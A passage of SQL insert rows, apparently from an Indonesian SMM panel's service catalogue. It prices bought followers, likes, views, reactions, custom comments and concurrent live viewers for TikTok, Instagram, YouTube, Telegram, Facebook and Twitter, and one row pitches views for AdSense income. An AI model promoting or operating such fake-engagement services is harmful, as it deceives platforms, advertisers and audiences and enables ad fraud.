(319, 19, 'TIKTOK FOLLOWERS Server 9 [ auto refill 30 hari ] REAL', 'refill 30 days\njika tidak terefill otomatis dalam 3 hari bisa req refill\nwaktu mulai 0-6 jam', 10, 50000, 190000, 95000, 1, 1, 8692),
(320, 10, 'instagram view Server 10 SUPERFAST [ VIDEO/REELS ] [ TV tidak Bisa ] Max 10M ', 'Speed: 1M - 2M In 15 minutes\nStart: Instant\nada beberapa pesanan yg status nya stuck\nsebelum kompline silahkan cek apakah sudah masuk atau belum view nya', 100, 10000000, 2660, 1330, 1, 1, 8693),
(321, 33, 'Youtube Subscribe S7 [ 60 days refill ] [ Speed Up to 3000/Day ] ', '0 - 1 Hour', 100, 50000, 2052000, 1026000, 1, 1, 8694),
(322, 53, 'Telegram PartyPopper Reaction', 'Proses bisa 1-2 hari\nbisa lebih cepat', 1, 10000, 2584, 1292, 1, 1, 8695),
(323, 53, 'Telegram StarStruck Reaction ', 'Proses bisa 1-2 hari\nbisa lebih cepat', 1, 10000, 2584, 1292, 1, 1, 8696),
(324, 53, 'Telegram Fire Reaction ', 'Proses bisa 1-2 hari\nbisa lebih cepat dan lebih lama', 1, 10000, 2584, 1292, 1, 1, 8697),
(325, 53, 'Telegram Love  Reaction', 'Proses bisa 1-2 hari\nbisa lebih cepat dan lebih lama', 1, 10000, 2584, 1292, 1, 1, 8698),
(326, 53, 'Telegram Like Reaction ', 'Proses bisa 1-2 hari\nbisa lebih cepat dan lebih lama', 1, 10000, 2584, 1292, 1, 1, 8699),
(327, 53, 'Telegram Like Reaction + Views (20/300k) [ 10k/hr ]', 'FAST \nINSTAN', 20, 300000, 28500, 14250, 1, 1, 8700),
(328, 53, 'Telegram Dislike Reaction + Views (20/300k) [ 10k/hr ] ', 'Instan\nFAST', 20, 300000, 28500, 14250, 1, 1, 8701),
(329, 53, 'Telegram Heart Reaction + Views (20/300k) [ 10k/hr ] ', 'Instan \nFAST', 20, 300000, 28500, 14250, 1, 1, 8702),
(330, 53, 'Telegram Fire Reaction + Views (20/300k) [ 10k/hr ] ', 'INSTAN\nFAST', 20, 300000, 28500, 14250, 1, 1, 8703),
(331, 53, 'Telegram PartyPopper Reaction + Views (20/300k) [ 10k/hr ] ', 'INSTAN\nFAST', 20, 300000, 28500, 14250, 1, 1, 8704),
(332, 53, 'Telegram StarStruck Reaction + Views (20/300k) [ 10k/hr ] ', 'INSTAN\nFAST', 20, 300000, 28500, 14250, 1, 1, 8705),
(333, 53, 'Telegram ScreaminFace Reaction + Views (20/300k) [ 10k/hr ] ', 'INSTAN \nFAST', 20, 300000, 28500, 14250, 1, 1, 8706),
(334, 53, 'Telegram BeamingFace Reaction + Views (20/300k) [ 10k/hr ] ', 'INSTAN\nFAST', 20, 300000, 28500, 14250, 1, 1, 8707),
(335, 53, 'Telegram CryingFace Reaction + Views (20/300k) [ 10k/hr ] ', 'INSTAN\nFAST', 20, 300000, 28500, 14250, 1, 1, 8708),
(336, 53, 'Telegram Tai ( PileofPoo ) Reaction + Views (20/300k) [ 10k/hr ] ', 'INSTAN\nFAST', 20, 300000, 28500, 14250, 1, 1, 8709),
(337, 53, 'Telegram Muntah ( FaceVomiting ) Reaction + Views (20/300k) [ 10k/hr ] ', 'INSTAN\nFAST', 20, 300000, 28500, 14250, 1, 1, 8710),
(338, 2, 'Telegram Post Views [90M] [ 1 Post ] TERMURAH DAN SUPERFAST', 'Instant\n2jt/hari\nNon Drop\nTarget/data  masukin link contoh https://t.me/medanpediaSMM/192\nExample Link: https://t.me/Your_Group/MessageID\nAtau bisa \nTarget/data  masukin link contoh https://t.me/medanpediaSMM\nExample Link: https://t.me/Your_Group/\nuntuk postingan terakhir', 100, 90000000, 197.6, 98.8, 1, 1, 8711),
(339, 19, 'TIKTOK FOLLOWERS Server 10 [ refill 7 hari ] 20K/Day ', '0-1 Hours', 100, 30000, 123500, 61750, 1, 1, 8712),
(340, 19, 'TIKTOK FOLLOWERS Server 11 [ 20K/Day ]', '20k/day', 100, 30000, 106400, 53200, 1, 1, 8713),
(341, 53, 'Telegram Post Reactions + Views [Positive]  [Refill: No] [Max: 1M] [Start Time: 0-1 Hour] [Speed: 600K/Day]', 'Pesan 1000 kadang yg masuk tidak tepat 1000 bisa cuman 500 ( no kompline )\ndan coba dlu pesan 100 karna ada beberapa chanel/grup yang tidak support\nkami tidak ada refund jika status sukses tetapi react nya gk masuk\nInstant start.\nInstant complete.\nGroup or channel\nPublic links only', 15, 1000000, 4560, 2280, 1, 1, 8714),
(342, 53, 'Telegram Post Reactions + Views [Negative] [Refill: No] [Max: 1M] [Start Time: 0-1 Hour] [Speed: 600K/Day] ', 'Pesan 1000 kadang yg masuk tidak tepat 1000 bisa cuman 500 ( no kompline )\ndan coba dlu pesan 100 karna ada beberapa chanel/grup yang tidak support\nkami tidak ada refund jika status sukses tetapi react nya gk masuk\nInstant start.\nInstant complete.\nGroup or channel\nPublic links only', 15, 1000000, 4560, 2280, 1, 1, 8715),
(343, 36, 'TIKTOK Share MP 5 [Refill 30 days]  10K/Day [ NonDrop ]', 'NonDrop', 10, 10000000, 653.6, 326.8, 1, 1, 8716),
(344, 54, 'TikTok Save Server 1 [ Refill 30days ]  5k/days ', 'Refill 30days \n5k/days', 100, 20000, 12160, 6080, 1, 1, 8717),
(345, 35, 'Instagram Custom Comments  [ 20k/days ] [No Drop]', 'No Drop\n20k/days', 10, 50000, 53200, 26600, 1, 1, 8718),
(346, 55, 'Tiktok Live Like [Max: 100K] [Start Time: Instant] [Speed: 100K/Day]', 'TikTok Live Likes\nService Starting Super Instant!\nDaily Speed : 100K Per Hour\n\nExample Link:\nhttps://www.tiktok.com/@username', 10, 1000000, 7600, 3800, 1, 1, 8719),
(347, 55, 'Tiktok Live Share [Max: 100K] [Start Time: Instant] [Speed: 100K/Day] ', 'Service Starting Super Instant!\nDaily Speed : 100K Per Hour\n\nExample Link:\nhttps://www.tiktok.com/@username', 10, 1000000, 39900, 19950, 1, 1, 8720),
(348, 33, 'Youtube Subscribe S8 [ LifeTime Refill ] [ 10k Per Day ] ', 'Lifetime Guarantee', 100, 100000, 642200, 321100, 1, 1, 8721),
(349, 38, 'Instagram Followers Server 12 [ Refill 365D ] [ Max 500k ] TERMURAH [ 100k-200k/days ]', 'nstant', 50, 500000, 17860, 8930, 1, 1, 8722),
(350, 20, 'TIKTOK Likes Server 19 [ TERMURAH DIDUNIA YANG  TIDAK GARANSI ] [ 1k-10K/Day ] ', 'Speed 1k-10K/Day', 10, 10000, 9120, 4560, 1, 1, 8723),
(351, 54, 'TikTok Save Server 2 [ Refill 30days ] 5k-10k/day', '5k-10k/day\nrefill 30 days', 100, 20000, 10830, 5415, 1, 1, 8724),
(352, 21, 'Youtube Like MP 15 Cheapest Indonesian [ No Refill ] Instant ', '0-15 Minutes', 10, 50000, 14668, 7334, 1, 1, 8725),
(353, 56, 'Facebook Group Member Server 2 [ No Refill  ] 1-15k/hari', '1-15k/hari\nlow drop bahkan tidak drop\ntapi tetap no refill jika drop', 1000, 150000, 129200, 64600, 1, 1, 8726),
(354, 56, 'Facebook Group Member Server 4 [ 30 Days Refill ] 500-1K/hari', 'Waktu mulai : 0-6jam\n30 Days Refill\n\nDetail:\nContoh link: https://www.facebook.com/groups/123\nLayanan ini hanya bekerja di grup publik\nJANGAN MELAKUKAN ORDER LEBIH 1 UNTUK LINK PADA WAKTU YANG SAMA.', 100, 25000, 108300, 54150, 1, 1, 8727),
(355, 9, 'Youtube Views S7 [ 5k/day speed ] + Suggested [ Lifetime Guarantee ] ', 'Source: Suggested + Direct + Browse Features ]\nSpeed 5k Per Day\nInstant Start\nLife Time Guarantee', 500, 55000, 36480, 18240, 1, 1, 8728),
(356, 10, 'instagram view Server 11 SUPERFAST [ VIDEO/REELS/TV ]Max 100M ', 'INSTANT\nSUPERFAST', 100, 100000000, 760, 380, 1, 1, 8729),
(357, 9, 'Youtube Views S8 [ 70K Per Day speed ] ( 100% Suggested Views ) [ Lifetime Guarantee ] BONUS LIKE', 'Guarantee:Lifetime\nSpeed : 50-70k/day\nSource:Suggested', 100, 1000000, 39900, 19950, 1, 1, 8730),
(358, 15, 'Shopee Followers [2K] MURAH NON DROP ', 'NON DROP\nFAST', 100, 2000, 45600, 22800, 1, 1, 8731),
(359, 42, 'Twitter Followers Server 22 [ Refill 30D ] [Non Drop] 20k/days', '20k/days\nRefill 30 days', 10, 20000, 117800, 58900, 1, 1, 8732),
(360, 42, 'Twitter Followers Server 23 [ Refill 30D ] [Non Drop] 50-100k/day ', 'Non Drop\nRefill 30D', 10, 100000, 133000, 66500, 1, 1, 8733),
(361, 42, 'Twitter Followers Server 24 [ NO REFILL ] [NOT RECOMENDED] ', 'waktu mulai 0-3 jam', 200, 20000, 38000, 19000, 1, 1, 8734),
(362, 19, 'TIKTOK FOLLOWERS Server 15 [ refill 30 hari ] [ Instant ] [ 50k/day Speed ] HQ Accounts', 'refill 30 hari\n50k/day Speed\n HQ Accounts', 100, 50000, 71250, 35625, 1, 1, 8735),
(363, 33, 'Youtube Subscribe S9  [ 30 days refill ] [ 150-200/day ] [ Non drop ]', '[ 30 days refill ] \n[ 150-200/day ] \n[ Non drop ]', 50, 15000, 437000, 218500, 1, 1, 8736),
(364, 19, 'TIKTOK FOLLOWERS Server 16 [ refill 30 hari ] [ 10k/day Speed ] ', 'Refill: 30 Days', 100, 100000, 57000, 28500, 1, 1, 8737),
(365, 19, 'TIKTOK FOLLOWERS Server 17 [ refill 30 hari ] [ Instant ] [ 100k/day Speed ] ', 'Instant \nrefill 30 hari\n100k/day', 10, 500000, 76000, 38000, 1, 1, 8738),
(366, 23, 'Facebook Photo / Post Share Server 1 [ max Max 500K] ', 'waktu mulai  0-6 jam', 100, 500000, 41800, 20900, 1, 1, 8739),
(367, 9, 'Youtube Views S9 ( Suggested Views ) [ Lifetime Guarantee ] [ 5-7K/day ]', 'Min 100\nRetention: 30 seconds to 60 Seconds\nNo Drop\nMax 1 Million\n\nSource: Suggested videos + Direct or unknown + Browse features\n( 30-35?ch Source )', 100, 55000, 36860, 18430, 1, 1, 8740),
(368, 9, 'Youtube Views S10 ( Suggested Views ) [ Lifetime Guarantee ] [ 50-70K/day ] ', 'Instant Start\nMin 100\nRetention: 30 seconds to 60 Seconds\nNo Drop\nMax 1 Million\n\nSource: Suggested videos + Direct or unknown + Browse features\n( 30-35?ch Source )', 100, 1000000, 39900, 19950, 1, 1, 8741),
(369, 17, 'Instagram Followers Indonesia S26 [ max 5k ] [ REFILL 7 DAYS ]✨ ', 'max 5k', 100, 500, 95000, 47500, 1, 1, 8742),
(370, 17, 'Instagram Followers Indonesia S27 [ min 1K ] [ REFILL 7 DAYS ]✨ ', 'min 1K\nmax 2k', 1000, 2000, 171000, 85500, 1, 1, 8743),
(371, 21, 'Youtube Video Custom Comments MP 2 TERMURAH [ 30k/day Speed ]', '30k/day Speed', 10, 100000, 87400, 43700, 1, 1, 8744),
(372, 55, 'Tiktok Live Like BATTLE Server 1  [Max: 100K] [Start Time: Instant] [Speed: 100K/Day] ', 'Speed: 100K/Day', 10, 1000000, 6840, 3420, 1, 1, 8745),
(373, 55, 'Tiktok Live Like BATTLE Server 2 [Max: 100K] [Start Time: 0 - 1 Hours] [Speed: 100K/Day] ', 'Speed: 100K/Day', 5, 1000000, 6840, 3420, 1, 1, 8746),
(374, 33, 'Youtube Subscribe S10 [ 90 days refill ] [ 150-200/day ] [ Non drop ] ', '200/Day', 20, 10000, 535800, 267900, 1, 1, 8747),
(375, 33, 'Youtube Subscribe S11 [ 90 days refill ] [ 1500-2000/day ] [ Non drop ] ', '1500-2000/day', 20, 20000, 934800, 467400, 1, 1, 8748),
(376, 49, 'Tiktok Likes Komentar [ R30D ] [ baca deskripsi Sebelum Order! ]', 'untuk order di web \ntarget masukin link poto\nLink Post masukin username\n\nuntuk order Via API\nparameter target masukin link poto\nparameter custom_link masukin username\n\n5k/day\nR30', 50, 5000, 34200, 17100, 1, 1, 8749),
(377, 49, 'Tiktok Komentar [ 3 HQ Random Komentar ] [Start Time: 0-1 Hour] [Finishes in 3 Hours]', 'Pesan Jumlah 1000 anda mendapat kan 3 komentar\nbukan order 1000 dapat 1000 komentar!\nHQ & Active Accounts\nkomentar sesuai dengan video konten mu', 1000, 1000, 33440, 16720, 1, 1, 8750),
(378, 49, 'Tiktok Komentar Kostum Server 1  [Refill 30 Days] [ LOW ] [Max: 10K]  [Speed: 1K/Hour]', 'Speed : 1K Per Hour\nNo Drop & 30 Day Refill Guarantee\nExample Link: Tiktok Video Link (All Video Link Acceeptable)', 10, 100000, 334400, 167200, 1, 1, 8751),
(379, 49, 'Tiktok Komentar Kostum Server 2 [Refill 30 Days] [Max: 10K] [Speed: 5K/Hour]', 'Speed: 5K/Hour', 10, 5000, 402800, 201400, 1, 1, 8752),
(380, 49, 'Tiktok Komentar [ 3 HQ Random Komentar ] [Start Time: 0-1 Hour]  Real and Active', 'Pesan Jumlah 1000 anda mendapat kan 3 komentar\nbukan order 1000 dapat 1000 komentar!\nHQ & Active Accounts\nkomentar sesuai dengan video konten mu', 1000, 1000, 11400, 5700, 1, 1, 8753),
(381, 38, 'Instagram Followers MDN 1 [ Refill 365D ] [ Max 500k ] ', 'Max 500k\n', 10, 500000, 22800, 11400, 1, 1, 8754),
(382, 29, 'Instagram Followers Server 5 LessDrop [ Refill 30D ] [ 10-15K/Day] ', 'Start Time: 0-1 Hour', 10, 100000, 22040, 11020, 1, 1, 8755),
(383, 48, 'Youtube views Refill 90 days [ Indonesia ] [Speed: 200-1000/Day] ', 'Targeted RAV - Real Active Views*\n100% Real Human Active YouTube Watch Page Views\nINSTANT START - 200-1000 / Day\nWatch Page Views - Monetizable!\nRandom Retention\nStable NON-DROP Views with 90 Days Refill Guarantee**\nWorld-Wide Views Added in a NON-STOP Natural Pattern\nMust be Unrestricted & Open for ALL countries\nOK for VEVO\nCancel any Time with Full/Partial Refund\nviews can be send to embed disabled video (including videos that live-streamed or premiered in the past)\nTraffic Sources: Direct Advertisement\n\n* views may include real user engagements - your video may get some daily likes/dislikes, comments, shares, subscribers\nall made by real YouTube users that we do not control!\n** If views added from external non-organic sources your guarantee may be revoked!\n* daily speeds vary by country and load', 500, 100000, 228000, 114000, 1, 1, 8756),
(384, 48, 'Youtube views Refill 90 days [ Francis ] [Speed: 200-1000/Day] ', 'Targeted RAV - Real Active Views*\n100% Real Human Active YouTube Watch Page Views\nINSTANT START - 200-1000 / Day\nWatch Page Views - Monetizable!\nRandom Retention\nStable NON-DROP Views with 90 Days Refill Guarantee**\nWorld-Wide Views Added in a NON-STOP Natural Pattern\nMust be Unrestricted & Open for ALL countries\nOK for VEVO\nCancel any Time with Full/Partial Refund\nviews can be send to embed disabled video (including videos that live-streamed or premiered in the past)\nTraffic Sources: Direct Advertisement\n\n* views may include real user engagements - your video may get some daily likes/dislikes, comments, shares, subscribers\nall made by real YouTube users that we do not control!\n** If views added from external non-organic sources your guarantee may be revoked!\n* daily speeds vary by country and load', 500, 100000, 228000, 114000, 1, 1, 8757),
(385, 48, 'Youtube views Refill 90 days [ Spanyol ] [Speed: 200-1000/Day] ', 'Targeted RAV - Real Active Views*\n100% Real Human Active YouTube Watch Page Views\nINSTANT START - 200-1000 / Day\nWatch Page Views - Monetizable!\nRandom Retention\nStable NON-DROP Views with 90 Days Refill Guarantee**\nWorld-Wide Views Added in a NON-STOP Natural Pattern\nMust be Unrestricted & Open for ALL countries\nOK for VEVO\nCancel any Time with Full/Partial Refund\nviews can be send to embed disabled video (including videos that live-streamed or premiered in the past)\nTraffic Sources: Direct Advertisement\n\n* views may include real user engagements - your video may get some daily likes/dislikes, comments, shares, subscribers\nall made by real YouTube users that we do not control!\n** If views added from external non-organic sources your guarantee may be revoked!\n* daily speeds vary by country and load', 500, 100000, 228000, 114000, 1, 1, 8758),
(386, 57, 'Youtube Subscribe [ INDONESIA ] [ LIFETIME GUARANTEE ]', 'Max 20k', 50, 10000, 1083000, 541500, 1, 1, 8759),
(387, 21, 'Youtube Like MP 16 [  INDONESIA ][ LIFETIME GUARANTEE ] Instant ', 'Max 20k', 10, 20000, 102600, 51300, 1, 1, 8760),
(388, 58, 'YouTube Live Stream [ 150 Minutes Live CONCURRENT ] [ Latest Service ] ', '150 Minutes Live CONCURRENT', 100, 35000, 991800, 495900, 1, 1, 8761),
(389, 58, 'YouTube Live Stream [ 24 Hour Live CONCURRENT ] [ Latest Service ] ', '24 Hour Live CONCURRENT', 100, 35000, 6080000, 3040000, 1, 1, 8762),
(390, 59, 'Youtube Live Chat Custom Comments [Live Stream / Premiere / Video Waiting To Be Published] [Mix] ', '*This service applies to Live Streaming, Premieres and Video Waiting To Be Published.\n\n- Start time: 0-5 minutes\n- Time for each comment to appear 25-35 seconds apart\n- Users from all over the world with full profile pictures\n\nLink format:\n+ https://www.youtube.com/watch?v=xxx\n+ https://youtu.be/xxx\nNote:\n- Live streaming with no age or country restrictions.\n- The service will not warrant for orders containing Spam keywords or violating the terms from Youtube (18+, gambling, fraud, ...)', 5, 10000, 201400, 100700, 1, 1, 8763),
(391, 59, 'Youtube Live Chat Custom Comments [Live Stream / Premiere / Video Waiting To Be Published] [USA] ', '*This service applies to Live Streaming, Premieres and Video Waiting To Be Published.\n\n- Start time: 0-5 minutes\n- Time for each comment to appear 25-35 seconds apart\n- User from USA with full profile picture\n\nLink format:\n+ https://www.youtube.com/watch?v=xxx\n+ https://youtu.be/xxx\nNote:\n- Live streaming with no age or country restrictions.\n- The service will not warrant for orders containing Spam keywords or violating the terms from Youtube (18+, gambling, fraud, ...)', 5, 10000, 201400, 100700, 1, 1, 8764),
(392, 59, 'Youtube Live Chat Custom Comments [Live Stream / Premiere / Video Waiting To Be Published] [INDIA] ', '*This service applies to Live Streaming, Premieres and Video Waiting To Be Published.\n\n- Start time: 0-5 minutes\n- Time for each comment to appear 25-35 seconds apart\n- User from India with full profile picture\n\nLink format:\n+ https://www.youtube.com/watch?v=xxx\n+ https://youtu.be/xxx\nNote:\n- Live streaming with no age or country restrictions.\n- The service will not warrant for orders containing Spam keywords or violating the terms from Youtube (18+, gambling, fraud, ...)', 5, 10000, 201400, 100700, 1, 1, 8765),
(393, 59, 'Youtube Live Chat Custom Comments [Live Stream / Premiere / Video Waiting To Be Published] [SOUTH KOREA] ', '*This service applies to Live Streaming, Premieres and Video Waiting To Be Published.\n\n- Start time: 0-5 minutes\n- Time for each comment to appear 25-35 seconds apart\n- User from South Korea with full profile picture\n\nLink format:\n+ https://www.youtube.com/watch?v=xxx\n+ https://youtu.be/xxx\nNote:\n- Live streaming with no age or country restrictions.\n- The service will not warrant for orders containing Spam keywords or violating the terms from Youtube (18+, gambling, fraud, ...)', 5, 10000, 201400, 100700, 1, 1, 8766),
(394, 59, 'Youtube Live Chat Custom Comments [Live Stream / Premiere / Video Waiting To Be Published] [VIETNAM] ', '*This service applies to Live Streaming, Premieres and Video Waiting To Be Published.\n\n- Start time: 0-5 minutes\n- Time for each comment to appear 25-35 seconds apart\n- User from Vietnam with full profile picture\n\nLink format:\n+ https://www.youtube.com/watch?v=xxx\n+ https://youtu.be/xxx\nNote:\n- Live streaming with no age or country restrictions.\n- The service will not warrant for orders containing Spam keywords or violating the terms from Youtube (18+, gambling, fraud, ...)', 5, 10000, 201400, 100700, 1, 1, 8767),
(395, 59, 'Youtube Live Chat Custom Comments [Live Stream / Premiere / Video Waiting To Be Published] [ARAB] ', '*This service applies to Live Streaming, Premieres and Video Waiting To Be Published.\n\n- Start time: 0-5 minutes\n- Time for each comment to appear 25-35 seconds apart\n- User from Arabs with full profile picture\n\nLink format:\n+ https://www.youtube.com/watch?v=xxx\n+ https://youtu.be/xxx\nNote:\n- Live streaming with no age or country restrictions.\n- The service will not warrant for orders containing Spam keywords or violating the terms from Youtube (18+, gambling, fraud, ...)', 5, 10000, 201400, 100700, 1, 1, 8768),
(396, 60, 'YouTube Live Stream [ 15 Minutes Live CONCURRENT ] [ Latest Service ] WORK', '15 Minutes Live CONCURRENT', 100, 20000, 119700, 59850, 1, 1, 8769),
(397, 60, 'YouTube Live Stream [ 30 Minutes Live CONCURRENT ] [ Latest Service ] WORK ', '30 Minutes Live CONCURRENT', 100, 20000, 233700, 116850, 1, 1, 8770),
(398, 60, 'YouTube Live Stream [ 60 Minutes Live CONCURRENT ] [ Latest Service ] WORK ', '60 Minutes Live CONCURRENT', 100, 20000, 475000, 237500, 1, 1, 8771),
(399, 60, 'YouTube Live Stream [ 90 Minutes Live CONCURRENT ] [ Latest Service ] WORK ', '90 Minutes Live CONCURRENT', 100, 20000, 703000, 351500, 1, 1, 8772),
(400, 60, 'YouTube Live Stream [ 2 hours Live CONCURRENT ] [ Latest Service ] WORK ', '2 hours Live CONCURRENT', 100, 20000, 969000, 484500, 1, 1, 8773),
(401, 60, 'YouTube Live Stream [ 3 hours Live CONCURRENT ] [ Latest Service ] WORK ', '3 hours Live CONCURRENT', 100, 20000, 1482000, 741000, 1, 1, 8774),
(402, 60, 'YouTube Live Stream [ 6 hours Live CONCURRENT ] [ Latest Service ] WORK ', '6 Hours Live CONCURRENT', 100, 20000, 2983000, 1491500, 1, 1, 8775),
(403, 60, 'YouTube Live Stream [ 12 hours Live CONCURRENT ] [ Latest Service ] WORK ', '12 Hours Live CONCURRENT', 100, 20000, 6239600, 3119800, 1, 1, 8776),
(404, 60, 'YouTube Live Stream [ 24 hours Live CONCURRENT ] [ Latest Service ] WORK ', '24 hours Live CONCURRENT', 100, 20000, 12471600, 6235800, 1, 1, 8777),
(405, 16, 'Instagram Likes S11 [ REAL ] ', '0-6 hours\nFast after start {200k/day}\nNo Refill/refund {no drop}\nMixed', 100, 100000, 1900, 950, 1, 1, 8778),
(406, 42, 'Twitter Followers Server 26 [ REFILL 30 DAYS ] [ 25k/day ] ', 'Instant\n20k-50k/day\nREFILL 30 DAYS\nLess Drop', 200, 50000, 37240, 18620, 1, 1, 8779),
(407, 16, 'Instagram Likes S12 [Refill 180 Days] [Max 50K] [5K/Day] ', 'Start Time: 1 Hour\nSpeed 5K/Day', 10, 250000, 3895, 1947.5, 1, 1, 8780),
(408, 16, 'Instagram Likes S13 [ Lifetime Guaranteed ] [ Real Mixed ] [5K/Day] ', 'Real Mixed\n10k/days', 10, 20000, 5700, 2850, 1, 1, 8781),
(409, 26, 'Youtube Live Stream Views [ Working ] [ NEW service ] [ 15 - 60 MInutes ] ', '- START : Instant\n- MONETIZABLE | REAL\n- 100% Real Human YouTube Users Viewers\n- 100% Unique Traffic\n- World-Wide Viewers\n- Avg Concurrent and watch-time based on live stream content\n- Video must Unrestricted , embed must enabled\nNOTE :\n- To get fast speed, Please order same link/same times ( x5 ,x10 times )\n- Cant refund after order\n- Views are spread over the time to deliver live viewers so that they stay for atleast 15 mins - 1H\nEx : You order 1000 views, then ,1000 live viewers will spread over the time in 15 mins - 1H+.', 1000, 10000000, 201400, 100700, 1, 1, 8782),
(410, 26, 'Youtube Live Stream Views [ NEW service ] [REAL] INSTANT', 'Mulai: INSTAN\nKecepatan: Cepat\nIsi ulang: Tidak ada isi ulang\n\nRetensi: Random\nKualitas: 100% Nyata\nCatatan:\n- Jika Live End, Video Dihapus, Video Pribadi, atau Dihapus oleh youtube - Tidak Ada Pengembalian Dana/ Tidak Ada Partial.\n- Silakan memesan tautan yang sama / waktu yang sama ( per 1 - 3 kali ) , Interval (menit) 1-3) untuk mendapatkan kecepatan cepat.\n- Kami tidak dapat menjamin total waktu tonton atau jumlah penonton serentak hanya total penayangan unik yang dikirim selama kampanye. \nTampilan tersebar dari waktu ke waktu untuk menghadirkan pemirsa langsung sehingga mereka bertahan setidaknya selama 15 menit - 2 jam tergantung jumlah pesanan', 1000, 1000000, 114000, 57000, 1, 1, 8783),
(411, 20, 'TIKTOK Likes Server 20 [ TERMURAH DIDUNIA ] [ max 1M ] ', 'Instant\nREAL', 100, 1000000, 9120, 4560, 1, 1, 8784),
(412, 2, 'Telegram - Channnel Members/Group Server 14 [ 100K ] Garansi 1 TAHUN', '70k-100k/day\nNO DROP\nKALO DROP TINGGAL MINTA REFILL DI TIKET\nINSTAN', 100, 100000, 72200, 36100, 1, 1, 8785),
(413, 29, 'Instagram Followers Server 6  [ Refill 30D ] [ FAST ] [ Real Engaging Followers ]', '10k/d', 10, 50000, 22040, 11020, 1, 1, 8786),
(414, 36, 'TIKTOK Share MP 8 [ Speed 50K/day ] ', 'Speed 50K/day', 100, 2000000, 1330, 665, 1, 1, 8787),
(415, 61, 'TikTok Story Likes  [ Max 30K ]  [ Day 10K ]', '[ Max 30K ]  [ Day 10K ]', 50, 30000, 17860, 8930, 1, 1, 8788),
(416, 61, 'TikTok Story Views [ Max 30K ] [ Day 10K ] [ All Stories ]', '[ Max 30K ] [ Day 10K ] [ All Stories ]', 100, 30000, 17860, 8930, 1, 1, 8789),
(417, 61, 'TikTok Story Views [ Max 30K ] [ Day 10K ] ', '[ Max 30K ] [ Day 10K ]', 100, 30000, 17860, 8930, 1, 1, 8790),
(418, 34, 'Instagram Followers Refill S77 [ Real Mixed ] [ 50K/day ] [ R60 ]', '50k/day\nLess Drop\nMixed Quality\nR30 [ button ]', 10, 100000, 13680, 6840, 1, 1, 8791),
(419, 29, 'Instagram Followers Server 7 [ Refill 30D ] [ HQ ] ', '0-3h Start\nReal Mixed\n2-5k/day\n10-20% drop', 20, 50000, 9880, 4940, 1, 1, 8792),
(420, 9, 'Youtube Views S11 [ Emergency Server ] [ 20k-100k/day ] [ Non Drop ] Lifetime ', 'Start Time: 0-1hr\nRefill: Lifetime (Non drop)\nRetention: 1-10 minutes\nSpeed: 20k-100k/day\nSource: Social Media Platforms + Others', 20000, 10000000, 105450, 52725, 1, 1, 8793),
(421, 43, 'Youtube views untuk penambah Adsense [NO DROP] [FULL ENGAGEMENT] [Speed: 50K/Day]', 'View Bisa Menghasilkan Pendapatan $9 dari 20k View yang kamu pesan. ( jika konten videonya bagus)\n\nKualitas Views :-\n. Retensi: Bergantung pada Konten\n. Sumber: Pengguna asli, Metode Organik - Iklan dari berbagai sumber\n. Negara: Seluruh Dunia\n. Istimewa: Penayangan Juga Akan Menghasilkan Pendapatan (Jika Berlaku).\n\nCatatan Layanan:-\n. Waktu mulai: 12 - 36 jam (untuk persetujuan Iklan)\n. Isi Ulang Hari: 30 Hari\n. Rasio Penurunan: Nol Penurunan\n. Kecepatan: 50K - 250K/Hari\n\nCATATAN:-\n1) Pengguna nyata (Anda akan mendapatkan keterlibatan)\n2) Zero Drop For Fresh Videos\n3) Suka/Tidak Suka + Tampilan + Komentar + Pelanggan (Tergantung pada Konten video dan jumlah yang dipesan)\n4) Tidak ada batasan panjang video (Semua Durasi Didukung)\n5) Tidak ada batasan untuk Konten video (Konten dewasa TIDAK Diizinkan)\n6) Tampilan Akan Menghasilkan Pendapatan.\n7) Waktu tonton akan dihitung untuk monetisasi', 20000, 100000000, 125400, 62700, 1, 1, 8794),
(422, 38, 'Instagram Followers MDN 2 [ Refill 365D ] [ Max 1M ] [ REAL ] Non Drop', '50k/days\nyg follow akun lama bukan akun baru\nSangat minim drop, jika drop kemungkinan update ig', 50, 1000000, 24700, 12350, 1, 1, 8795),
(423, 38, 'Instagram Followers MDN 3 [ Refill 365D ] [ Max 1M ] [ 10% interaction ] [ HQ ] ♻️', 'Days 50K\nbutton refill 30days di riwayat order\nkemungkinan besar ada 10% interaction diakunmu\nSangat minim drop, jika drop kemungkinan update ig\nHQ\n\nkemungkinan order 1000 mendapat hanya 900 followers\nanda bisa minta refill setelah 24 jam pesanan sukses', 50, 1000000, 24700, 12350, 1, 1, 8796),
(424, 12, 'Youtube Short Views Server 5  [Refill Lifetime] [Start Time:0 -24 Hours] [Speed: 60K/Day] ', 'Max 5M', 100, 50000000, 50160, 25080, 1, 1, 8797),
(425, 12, 'Youtube Short Views Server 6 [Refill Lifetime] [Start Time: 0 - 6 Hours] [Speed: 400K/Day] ', 'Speed: 400K/Day', 25000, 2147483647, 118940, 59470, 1, 1, 8798),
(426, 21, 'Youtube Like MP 17 [ R30 ][ 2-3k/day ]  LESSDROP', '0-6h Start\nR30\nSpeed - 2-3k/d\nDrop 1-3%', 50, 100000, 68400, 34200, 1, 1, 8799),
(427, 21, 'Youtube Like MP 18 [ R30 ][ 40k/day ] Nondrop', '30D refill\nfast server', 20, 100000, 66880, 33440, 1, 1, 8800),
(428, 22, 'Facebook Follower Profile MP 16 [ Refill 90days ] Less drop', '1k/d', 1000, 200000, 98800, 49400, 1, 1, 8801),
(429, 22, 'Facebook Follower Profile MP 17 [ NONdrop ] ', 'INSTANT START\nMasukin target Link Profil! ( tidak untuk fanspage )\nReal Followers\nSpeed - 1k/Hour\nNO DROP\nWalaupun Keterangan NODROP tapi kami tidak ada garansi!\nWe provide 10% Extra Followers for covering minor drops', 50, 1000, 190000, 95000, 1, 1, 8802),
(430, 62, 'YouTube Live Stream Views [ max 200 ] [ 30 Minutes Live CONCURRENT ]', 'Start in 5 Minutes\n1000 Live Orders will Get 900-1000 Live Stream Viewers', 100, 200, 68020, 34010, 1, 1, 8803),
(431, 62, 'YouTube Live Stream Views [ max 200 ] [ 60 Minutes Live CONCURRENT ] ', 'Start in 5 Minutes\n1000 Live Orders will Get 900-1000 Live Stream Viewers', 100, 200, 98420, 49210, 1, 1, 8804),
(432, 62, 'YouTube Live Stream Views [ max 200 ] [ 90 Minutes Live CONCURRENT ] ', 'Start in 5 Minutes\n1000 Live Orders will Get 900-1000 Live Stream Viewers', 100, 200, 153140, 76570, 1, 1, 8805),
